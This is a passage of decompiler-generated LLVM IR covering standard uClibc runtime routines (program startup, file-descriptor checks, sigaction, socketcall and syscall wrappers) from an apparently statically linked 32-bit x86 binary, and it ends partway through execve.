define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8054ce2 = load i32, i32* @eax, align 4
  ret i32 %v0_8054ce2
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8054ce3 = load i32, i32* @esi, align 4
  %v0_8054ce4 = load i32, i32* @eax, align 4
  store i32 %v0_8054ce4, i32* @esi, align 4
  %v0_8054ce6 = load i32, i32* @ebx, align 4
  store i32 %v0_8054ce6, i32* %stack_var_-8, align 4
  %v0_8054ce7 = load i32, i32* @edx, align 4
  store i32 %v0_8054ce7, i32* @ebx, align 4
  %v4_8054cef = call i32 @__libc_fcntl(i32 %v0_8054ce4, i32 1, i32 %tmp6)
  %v8_8054cf7 = icmp eq i32 %v4_8054cef, -1
  %v1_8054cf8 = icmp eq i1 %v8_8054cf7, false
  br i1 %v1_8054cf8, label %dec_label_pc_8054d13, label %dec_label_pc_8054cfa

dec_label_pc_8054cfa:                             ; preds = %entry
  %v0_8054cfc = load i32, i32* @ebx, align 4
  %v5_8054d02 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805ab6c.534, i32 0, i32 0), i32 %v0_8054cfc)
  %v1_8054d0a = load i32, i32* @esi, align 4
  %v12_8054d0a = icmp eq i32 %v5_8054d02, %v1_8054d0a
  br i1 %v12_8054d0a, label %dec_label_pc_8054d13, label %dec_label_pc_8054d0e

dec_label_pc_8054d0e:                             ; preds = %dec_label_pc_8054cfa
  %v0_8054d0e = call i32 @abort()
  br label %dec_label_pc_8054d13

dec_label_pc_8054d13:                             ; preds = %dec_label_pc_8054cfa, %entry, %dec_label_pc_8054d0e
  %v2_8054d13 = load i32, i32* %stack_var_-12, align 4
  %v2_8054d14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054d14, i32* @ebx, align 4
  store i32 %v0_8054ce3, i32* @esi, align 4
  ret i32 %v2_8054d13

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 5, 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054d13, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8054d1a = load i8, i8* @global_var_806179c.535, align 4
  %v1_8054d1a = icmp eq i8 %v0_8054d1a, 0
  %v1_8054d21 = icmp eq i1 %v1_8054d1a, false
  br i1 %v1_8054d21, label %entry.dec_label_pc_8054d53_crit_edge, label %dec_label_pc_8054d23

entry.dec_label_pc_8054d53_crit_edge:             ; preds = %entry
  %v0_8054d56.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054d53

dec_label_pc_8054d23:                             ; preds = %entry
  store i8 1, i8* @global_var_806179c.535, align 4
  store i32 4096, i32* @global_var_8061790.457, align 16
  %v0_8054d4e = call i32 @_stdio_init()
  br label %dec_label_pc_8054d53

dec_label_pc_8054d53:                             ; preds = %entry.dec_label_pc_8054d53_crit_edge, %dec_label_pc_8054d23
  %v0_8054d56 = phi i32 [ %v0_8054d56.pre, %entry.dec_label_pc_8054d53_crit_edge ], [ %v0_8054d4e, %dec_label_pc_8054d23 ]
  ret i32 %v0_8054d56

; uselistorder directives
  uselistorder i8* @global_var_806179c.535, { 1, 0 }
  uselistorder label %dec_label_pc_8054d53, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_8054d58 = load i32, i32* @edi, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8061788.536, align 8
  store i32 %arg6, i32* @global_var_8061798.533, align 8
  %v2_8054d8e = mul i32 %arg2, 4
  %v3_8054d8e = add i32 %tmp29, %v2_8054d8e
  %v1_8054d91 = add i32 %v3_8054d8e, 4
  store i32 %v1_8054d91, i32* @global_var_806178c.528, align 4
  %v3_8054d9a = load i32, i32* %arg3, align 4
  %v14_8054d9a = icmp eq i32 %v1_8054d91, %v3_8054d9a
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8054da0 = icmp eq i1 %v14_8054d9a, false
  %v4_8054da0 = select i1 %v1_8054da0, i32 %v1_8054d91, i32 %v3_8054d8e
  store i32 %v4_8054da0, i32* @global_var_806178c.528, align 4
  %v2_8054da8 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054dad = bitcast i32* %stack_var_-136 to i8*
  %v4_8054dad = call i32 @__GI_memset(i8* %v3_8054dad, i32 0, i32 120)
  %v0_8054db2 = load i32, i32* @global_var_806178c.528, align 4
  br label %dec_label_pc_8054dba

dec_label_pc_8054dba:                             ; preds = %dec_label_pc_8054dba, %entry
  %v0_8054dba = phi i32 [ %v1_8054dbd, %dec_label_pc_8054dba ], [ %v0_8054db2, %entry ]
  %v1_8054dba = inttoptr i32 %v0_8054dba to i32*
  %v2_8054dba = load i32, i32* %v1_8054dba, align 4
  %v3_8054dba = icmp eq i32 %v2_8054dba, 0
  %v1_8054dbd = add i32 %v0_8054dba, 4
  %v1_8054dc0 = icmp eq i1 %v3_8054dba, false
  br i1 %v1_8054dc0, label %dec_label_pc_8054dba, label %dec_label_pc_8054de1.preheader

dec_label_pc_8054de1.preheader:                   ; preds = %dec_label_pc_8054dba
  store i32 %v1_8054dbd, i32* @ebx, align 4
  %v1_8054de11 = inttoptr i32 %v1_8054dbd to i32*
  %v2_8054de12 = load i32, i32* %v1_8054de11, align 4
  %v3_8054de13 = icmp eq i32 %v2_8054de12, 0
  %v1_8054de410 = icmp eq i1 %v3_8054de13, false
  br i1 %v1_8054de410, label %dec_label_pc_8054dc6.lr.ph, label %dec_label_pc_8054de6

dec_label_pc_8054dc6.lr.ph:                       ; preds = %dec_label_pc_8054de1.preheader
  %v3_8054d9e = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054dd1 = add i32 %v3_8054d9e, 32
  br label %dec_label_pc_8054dc6

dec_label_pc_8054dc6:                             ; preds = %dec_label_pc_8054dc6.lr.ph, %dec_label_pc_8054dde
  %v1_8054dd1 = phi i32 [ %v2_8054de12, %dec_label_pc_8054dc6.lr.ph ], [ %v2_8054de1, %dec_label_pc_8054dde ]
  %v0_8054dd0 = phi i32 [ %v1_8054dbd, %dec_label_pc_8054dc6.lr.ph ], [ %v1_8054dde, %dec_label_pc_8054dde ]
  %v6_8054dcb = icmp ugt i32 %v1_8054dd1, 14
  br i1 %v6_8054dcb, label %dec_label_pc_8054dde, label %dec_label_pc_8054dcd

dec_label_pc_8054dcd:                             ; preds = %dec_label_pc_8054dc6
  store i32 %v0_8054dd0, i32* %stack_var_-168, align 4
  %v2_8054dd1 = mul i32 %v1_8054dd1, 8
  %v4_8054dd1 = add i32 %v3_8054dd1, %v2_8054dd1
  %v3_8054dd6 = inttoptr i32 %v4_8054dd1 to i16*
  %v4_8054dd6 = call i32 @memcpy(i16* %v3_8054dd6, i32 %v0_8054dd0, i32 8)
  %v0_8054dde.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054dde

dec_label_pc_8054dde:                             ; preds = %dec_label_pc_8054dc6, %dec_label_pc_8054dcd
  %v0_8054dde = phi i32 [ %v0_8054dd0, %dec_label_pc_8054dc6 ], [ %v0_8054dde.pre, %dec_label_pc_8054dcd ]
  %v1_8054dde = add i32 %v0_8054dde, 8
  store i32 %v1_8054dde, i32* @ebx, align 4
  %v1_8054de1 = inttoptr i32 %v1_8054dde to i32*
  %v2_8054de1 = load i32, i32* %v1_8054de1, align 4
  %v3_8054de1 = icmp eq i32 %v2_8054de1, 0
  %v1_8054de4 = icmp eq i1 %v3_8054de1, false
  br i1 %v1_8054de4, label %dec_label_pc_8054dc6, label %dec_label_pc_8054de6

dec_label_pc_8054de6:                             ; preds = %dec_label_pc_8054dde, %dec_label_pc_8054de1.preheader
  store i32 %v2_8054da8, i32* @eax, align 4
  %v0_8054dea = call i32 @_dl_aux_init()
  store i32 %v0_8054dea, i32* @eax, align 4
  %v0_8054def = call i32 @__GI___uClibc_init()
  %v1_8054dfd = icmp eq i32 %tmp24, 0
  %v3_8054dff = select i1 %v1_8054dfd, i32 4096, i32 %tmp24
  %v13_8054e02 = icmp eq i32 %tmp23, -1
  store i32 %v3_8054dff, i32* @global_var_8061790.457, align 16
  %v1_8054e0c = icmp eq i1 %v13_8054e02, false
  br i1 %v1_8054e0c, label %dec_label_pc_8054e37, label %dec_label_pc_8054e0e

dec_label_pc_8054e0e:                             ; preds = %dec_label_pc_8054de6
  %v0_8054e0e = call i32 @getuid()
  store i32 %v0_8054e0e, i32* @ebx, align 4
  %v0_8054e15 = call i32 @geteuid()
  %v0_8054e1a = load i32, i32* @ebx, align 4
  %v12_8054e1a = icmp eq i32 %v0_8054e1a, %v0_8054e15
  %v1_8054e1c = icmp eq i1 %v12_8054e1a, false
  br i1 %v1_8054e1c, label %dec_label_pc_8054e4d, label %dec_label_pc_8054e1e

dec_label_pc_8054e1e:                             ; preds = %dec_label_pc_8054e0e
  %v0_8054e1e = call i32 @getgid()
  store i32 %v0_8054e1e, i32* @ebx, align 4
  %v0_8054e25 = call i32 @getegid()
  %v0_8054e2a = load i32, i32* @ebx, align 4
  %v12_8054e2a = icmp eq i32 %v0_8054e2a, %v0_8054e25
  %v1_8054e2c = icmp eq i1 %v12_8054e2a, false
  br i1 %v1_8054e2c, label %dec_label_pc_8054e4d, label %dec_label_pc_8054e2e.thread

dec_label_pc_8054e2e.thread:                      ; preds = %dec_label_pc_8054e1e
  br label %dec_label_pc_8054e77

dec_label_pc_8054e37:                             ; preds = %dec_label_pc_8054de6
  %v15_8054e37 = icmp eq i32 %tmp23, %tmp22
  %v1_8054e3b = icmp eq i1 %v15_8054e37, false
  br i1 %v1_8054e3b, label %dec_label_pc_8054e4d, label %dec_label_pc_8054e3d

dec_label_pc_8054e3d:                             ; preds = %dec_label_pc_8054e37
  br label %dec_label_pc_8054e4d

dec_label_pc_8054e4d:                             ; preds = %dec_label_pc_8054e3d, %dec_label_pc_8054e37, %dec_label_pc_8054e1e, %dec_label_pc_8054e0e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054e54 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8054e63 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8054e72 = call i32 @__check_one_fd()
  br label %dec_label_pc_8054e77

dec_label_pc_8054e77:                             ; preds = %dec_label_pc_8054e2e.thread, %dec_label_pc_8054e4d
  %v0_8054e77 = load i32, i32* @edi, align 4
  %v1_8054e77 = inttoptr i32 %v0_8054e77 to i32*
  %v2_8054e77 = load i32, i32* %v1_8054e77, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8054e77, i32* inttoptr (i32 134591736 to i32*), align 8
  store i32 %arg5, i32* @global_var_8061794.532, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_8054e9c, label %dec_label_pc_8054ea8

dec_label_pc_8054e9c:                             ; preds = %dec_label_pc_8054e77, %dec_label_pc_8054e9c
  %v4_8054e9c54 = phi i32 [ %v1_8054ea3, %dec_label_pc_8054e9c ], [ 0, %dec_label_pc_8054e77 ]
  %v5_8054e9c = mul i32 %v4_8054e9c54, 4
  %v6_8054e9c = add i32 %v5_8054e9c, ptrtoint (i32* @global_var_805b000.530 to i32)
  %v7_8054e9c = inttoptr i32 %v6_8054e9c to i32*
  %v8_8054e9c = load i32, i32* %v7_8054e9c, align 4
  call void @__pseudo_call(i32 %v8_8054e9c)
  %v0_8054ea3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054ea3 = add i32 %v0_8054ea3, 1
  store i32 %v1_8054ea3, i32* %ebx.global-to-local, align 4
  %v1_8054ea4 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054ea4 = icmp ult i32 %v1_8054ea3, %v1_8054ea4
  br i1 %v7_8054ea4, label %dec_label_pc_8054e9c, label %dec_label_pc_8054ea8

dec_label_pc_8054ea8:                             ; preds = %dec_label_pc_8054e9c, %dec_label_pc_8054e77
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 0), label %dec_label_pc_8054ec0, label %dec_label_pc_8054ecc

dec_label_pc_8054ec0:                             ; preds = %dec_label_pc_8054ea8, %dec_label_pc_8054ec0
  %v4_8054ec044 = phi i32 [ %v1_8054ec7, %dec_label_pc_8054ec0 ], [ 0, %dec_label_pc_8054ea8 ]
  store i32 ptrtoint (i32* @global_var_8054ec7.539 to i32), i32* %stack_var_-168, align 4
  %v5_8054ec0 = mul i32 %v4_8054ec044, 4
  %v6_8054ec0 = add i32 %v5_8054ec0, ptrtoint (i32* @global_var_805b000.530 to i32)
  %v7_8054ec0 = inttoptr i32 %v6_8054ec0 to i32*
  %v8_8054ec0 = load i32, i32* %v7_8054ec0, align 4
  call void @__pseudo_call(i32 %v8_8054ec0)
  %v0_8054ec7 = load i32, i32* @ebx, align 4
  %v1_8054ec7 = add i32 %v0_8054ec7, 1
  store i32 %v1_8054ec7, i32* @ebx, align 4
  %v1_8054ec8.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8054ec8 = icmp ult i32 %v1_8054ec7, %v1_8054ec8.pre
  br i1 %v7_8054ec8, label %dec_label_pc_8054ec0, label %dec_label_pc_8054ecc

dec_label_pc_8054ecc:                             ; preds = %dec_label_pc_8054ec0, %dec_label_pc_8054ea8
  %v0_8054ed5 = load i32, i32* %stack_var_-168, align 4
  %v1_8054ed5 = call i32 @__errno_location(i32 %v0_8054ed5)
  %v1_8054eda = inttoptr i32 %v1_8054ed5 to i32*
  store i32 0, i32* %v1_8054eda, align 4
  %v0_8054ee9 = call i32 @__GI___h_errno_location()
  store i32 %v0_8054ee9, i32* @eax, align 4
  %v1_8054eee = inttoptr i32 %v0_8054ee9 to i32*
  store i32 0, i32* %v1_8054eee, align 4
  %v0_8054ef4 = load i32, i32* @eax, align 4
  store i32 %v0_8054ef4, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_8054d58)
  %v0_8054f0a = load i32, i32* @eax, align 4
  %v1_8054f0d = call i32 @__GI_exit(i32 %v0_8054f0a)
  %v0_8054f19 = load i32, i32* @ebx, align 4
  %v1_8054f19 = inttoptr i32 %v0_8054f19 to %sigcontext*
  %v2_8054f19 = call i32 @sigreturn(%sigcontext* %v1_8054f19)
  %v0_8054f21 = load i32, i32* @ebx, align 4
  %v1_8054f21 = inttoptr i32 %v0_8054f21 to %sigcontext*
  %v2_8054f21 = call i32 @sigreturn(%sigcontext* %v1_8054f21)
  ret i32 %v2_8054f21

; uselistorder directives
  uselistorder i32 %v1_8054ec7, { 1, 2, 0 }
  uselistorder i32 %v1_8054ea3, { 1, 2, 0 }
  uselistorder i32 %v2_8054de1, { 1, 0 }
  uselistorder i32 %v1_8054dde, { 2, 1, 0 }
  uselistorder i32 %v1_8054dbd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054dba, { 1, 0 }
  uselistorder i32 %v1_8054d91, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_805b000.530 to i32), i32 -134590464), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_8054ec0, { 1, 0 }
  uselistorder label %dec_label_pc_8054e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8054e77, { 1, 0 }
  uselistorder label %dec_label_pc_8054dde, { 1, 0 }
  uselistorder label %dec_label_pc_8054dc6, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054f23 = load i32, i32* @esi, align 4
  %v0_8054f24 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054f39 = icmp eq i32* %arg2, null
  br i1 %v1_8054f39, label %dec_label_pc_8054f8d, label %dec_label_pc_8054f3d

dec_label_pc_8054f3d:                             ; preds = %entry
  %v2_8054f3d = load i32, i32* %arg2, align 4
  store i32 %v2_8054f3d, i32* %stack_var_-148, align 4
  %v1_8054f46 = add i32 %tmp11, 4
  %v3_8054f58 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054f58 = call i32 @memcpy(i16* %v3_8054f58, i32 %v1_8054f46, i32 128)
  br label %dec_label_pc_8054f8d

dec_label_pc_8054f8d:                             ; preds = %entry, %dec_label_pc_8054f3d
  %v1_8054f8f = icmp eq i32 %arg3, 0
  br i1 %v1_8054f8f, label %dec_label_pc_8054f97, label %dec_label_pc_8054f93

dec_label_pc_8054f93:                             ; preds = %dec_label_pc_8054f8d
  %v2_8054f93 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054f97

dec_label_pc_8054f97:                             ; preds = %dec_label_pc_8054f8d, %dec_label_pc_8054f93
  %v0_8054fa6 = phi i32 [ 0, %dec_label_pc_8054f8d ], [ %v2_8054f93, %dec_label_pc_8054f93 ]
  br i1 %v1_8054f39, label %dec_label_pc_8054fa4, label %dec_label_pc_8054f9d

dec_label_pc_8054f9d:                             ; preds = %dec_label_pc_8054f97
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8054fa4

dec_label_pc_8054fa4:                             ; preds = %dec_label_pc_8054f97, %dec_label_pc_8054f9d
  %v0_8054fa7 = phi %sigaction* [ null, %dec_label_pc_8054f97 ], [ %phitmp, %dec_label_pc_8054f9d ]
  %v5_8054faf = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8054fa7, i32 %v0_8054fa6, i32 8)
  store i32 %v5_8054faf, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054f8f, label %dec_label_pc_8054ff2, label %dec_label_pc_8054fbd

dec_label_pc_8054fbd:                             ; preds = %dec_label_pc_8054fa4
  %v2_8054fbd = icmp slt i32 %v5_8054faf, 0
  br i1 %v2_8054fbd, label %dec_label_pc_8054ff2, label %dec_label_pc_8054fc1

dec_label_pc_8054fc1:                             ; preds = %dec_label_pc_8054fbd
  %v3_8054fc1 = load i32, i32* %stack_var_-288, align 4
  %v2_8054fc5 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054fc1, i32* %v2_8054fc5, align 4
  %v2_8054fcd = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054fd2 = add i32 %arg3, 4
  %v3_8054fd6 = inttoptr i32 %v1_8054fd2 to i16*
  %v4_8054fd6 = call i32 @memcpy(i16* %v3_8054fd6, i32 %v2_8054fcd, i32 128)
  %v2_8054fdf = add i32 %arg3, 132
  %v3_8054fdf = inttoptr i32 %v2_8054fdf to i32*
  %v2_8054fec = add i32 %arg3, 136
  %v3_8054fec = inttoptr i32 %v2_8054fec to i32*
  %v0_8054ff8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054ff2

dec_label_pc_8054ff2:                             ; preds = %dec_label_pc_8054fbd, %dec_label_pc_8054fa4, %dec_label_pc_8054fc1
  %v0_8054ff8 = phi i32 [ %v5_8054faf, %dec_label_pc_8054fbd ], [ %v5_8054faf, %dec_label_pc_8054fa4 ], [ %v0_8054ff8.pre, %dec_label_pc_8054fc1 ]
  store i32 %v0_8054f24, i32* @ebx, align 4
  store i32 %v0_8054f23, i32* @esi, align 4
  ret i32 %v0_8054ff8

; uselistorder directives
  uselistorder i1 %v1_8054f8f, { 1, 0 }
  uselistorder i1 %v1_8054f39, { 1, 0 }
  uselistorder i32* null, { 0, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8054ff2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054fa4, { 1, 0 }
  uselistorder label %dec_label_pc_8054f97, { 1, 0 }
  uselistorder label %dec_label_pc_8054f8d, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8055003 = load i32, i32* @eax, align 4
  %v1_8055005 = sub i32 0, %v0_8055003
  %v1_8055007 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_805500c = inttoptr i32 %v1_8055007 to i32*
  store i32 %v1_8055005, i32* %v2_805500c, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8055018 = load i32, i32* @ebx, align 4
  %v2_805501f = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805501f, i32* @ebx, align 4
  %v8_8055023 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8055018, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_8055023, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134565888)
  ret i32 %v8_8055023

; uselistorder directives
  uselistorder i32 %v8_8055023, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134565888, { 1, 0 }
  uselistorder i32 -4096, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055034 = load i32, i32* @ebx, align 4
  store i32 %v0_8055034, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8055047 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8055047, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8055047, -4095
  br i1 %tmp, label %dec_label_pc_8055060, label %dec_label_pc_8055054

dec_label_pc_8055054:                             ; preds = %entry
  %v0_8055054 = load i32, i32* %stack_var_-4, align 4
  %v1_8055054 = call i32 @__errno_location(i32 %v0_8055054)
  %v0_8055059 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055059 = sub i32 0, %v0_8055059
  %v2_805505b = inttoptr i32 %v1_8055054 to i32*
  store i32 %v1_8055059, i32* %v2_805505b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055060

dec_label_pc_8055060:                             ; preds = %entry, %dec_label_pc_8055054
  %v0_8055061 = phi i32 [ %v1_8055047, %entry ], [ -1, %dec_label_pc_8055054 ]
  %v2_8055060 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055060, i32* @edx, align 4
  %v2_8055064 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055064, i32* @ebx, align 4
  ret i32 %v0_8055061

; uselistorder directives
  uselistorder i32 %v1_8055047, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055060, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055069 = load i32, i32* @esi, align 4
  store i32 %v0_8055069, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805507d = load i32, i32* @ebx, align 4
  %v7_8055085 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8055085, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8055085, -4095
  br i1 %tmp, label %dec_label_pc_805509d, label %dec_label_pc_8055091

dec_label_pc_8055091:                             ; preds = %entry
  %v1_8055091 = call i32 @__errno_location(i32 %v0_805507d)
  %v0_8055096 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055096 = sub i32 0, %v0_8055096
  %v2_8055098 = inttoptr i32 %v1_8055091 to i32*
  store i32 %v1_8055096, i32* %v2_8055098, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805509d

dec_label_pc_805509d:                             ; preds = %entry, %dec_label_pc_8055091
  %v0_805509e = phi i32 [ %v7_8055085, %entry ], [ -1, %dec_label_pc_8055091 ]
  %v2_805509d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805509d, i32* @edx, align 4
  %v2_80550a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80550a0, i32* @esi, align 4
  ret i32 %v0_805509e

; uselistorder directives
  uselistorder i32 %v7_8055085, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805509d, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80550a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80550a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80550b7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80550b7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80550b7, -4095
  br i1 %tmp, label %dec_label_pc_80550d0, label %dec_label_pc_80550c4

dec_label_pc_80550c4:                             ; preds = %entry
  %v0_80550c4 = load i32, i32* %stack_var_-4, align 4
  %v1_80550c4 = call i32 @__errno_location(i32 %v0_80550c4)
  %v0_80550c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80550c9 = sub i32 0, %v0_80550c9
  %v2_80550cb = inttoptr i32 %v1_80550c4 to i32*
  store i32 %v1_80550c9, i32* %v2_80550cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550d0

dec_label_pc_80550d0:                             ; preds = %entry, %dec_label_pc_80550c4
  %v0_80550d1 = phi i32 [ %v4_80550b7, %entry ], [ -1, %dec_label_pc_80550c4 ]
  %v2_80550d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80550d0, i32* @edx, align 4
  %v2_80550d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80550d4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80550d1

; uselistorder directives
  uselistorder i32 %v4_80550b7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80550d0, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80550d8 = load i32, i32* @edi, align 4
  store i32 %v0_80550d8, i32* %stack_var_-4, align 4
  %v4_80550dc = ptrtoint i8* %arg1 to i32
  store i32 %v4_80550dc, i32* %edi.global-to-local, align 4
  %v0_80550e8 = load i32, i32* @ebx, align 4
  %v5_80550f0 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
